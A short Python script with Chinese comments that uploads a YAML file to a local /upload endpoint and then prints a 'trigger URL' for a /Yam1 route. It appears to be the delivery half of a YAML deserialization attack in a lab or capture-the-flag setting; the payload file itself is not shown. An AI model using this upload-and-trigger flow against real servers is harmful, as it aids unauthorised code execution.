import requests

# 目标URL
target_url = "http://127.0.0.1:5000/upload"

# 要上传的YAML文件路径
file_path = "test.yaml"

# 上传文件
with open(file_path, 'rb') as f:
    files = {'file': (file_path, f, 'application/x-yaml')}
    response = requests.post(target_url, files=files)

# 显示结果
print(f"状态码: {response.status_code}")

print(f"响应内容: {response.text}")

# 如果成功，提示如何触发
if response.status_code == 200:
    filename = file_path.rsplit('.', 1)[0]
    print(f"\n触发URL: http://目标服务器/Yam1?filename={filename}")